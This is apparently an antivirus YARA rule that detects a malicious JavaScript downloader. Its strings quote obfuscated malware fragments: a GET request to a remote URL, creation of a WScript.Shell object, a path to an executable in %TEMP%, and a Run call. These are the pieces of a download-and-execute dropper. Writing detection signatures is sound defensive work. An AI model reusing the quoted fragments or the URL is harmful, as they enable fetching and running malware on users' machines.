rule sig_20160401_540ca4731a07da657d8b84691b76231a {
  meta:
    description = "datamaliciousorder - file 20160401_540ca4731a07da657d8b84691b76231a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7857a0f1968b48f2fd35bf208c0113f3a8cede258b914646b02373b6af39f14f"

  strings:
    $s1  = "OabJj[IiRm](\"G\" + \"ET\", \"http://echo-gs.net/h6dskl\", false);" fullword ascii
    $s2  = "function GobJrc(NxKw, ErAbb){TpDr = TpDr * 1; return NxKw - ErAbb;};" fullword ascii
    $s3  = "if (OabJj[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function EgiPfh(){return RfzOo + \"\";};" fullword ascii
    $s5  = "var HlQu = function RojEn() {return WScript[UnOqp](\"WScript\"+\".Shell\");}(), CatAh = 11;" fullword ascii
    $s6  = "function DmYf() {return ((SdwZz == true) && (SdwZz == DjKfd)) ? 1 : TpDr;};" fullword ascii
    $s7  = "function TbUo(MmFhi) {var NvRmk = (1, 2, 3, 4, 5, MmFhi); return NvRmk;};" fullword ascii
    $s8  = "var WqIs = new this[\"Date\"]();" fullword ascii
    $s9  = "DjKfd = true; " fullword ascii
    $s10 = "function MdpEcz(UjrLke){HlQu[\"R\"+\"un\"](UjrLke, TpDr, TpDr);};" fullword ascii
    $s11 = "function RaZgm(){return 23;};" fullword ascii
    $s12 = "}while (MqNh);" fullword ascii
    $s13 = "function ScaFxd() {return HlQu[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"LoICVUwR.ex\" + \"e\";};" fullword ascii
    $s14 = "function XlDtv()" fullword ascii
    $s15 = "function McBa(){return UnOqp;};" fullword ascii
    $s16 = "SdwZz = true; " fullword ascii
    $s17 = "var LkyAtc = false;" fullword ascii
    $s18 = "var DjKfd = false;" fullword ascii
    $s19 = "return GobJrc(LqAk, CyMub);" fullword ascii
    $s20 = "var SdwZz = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}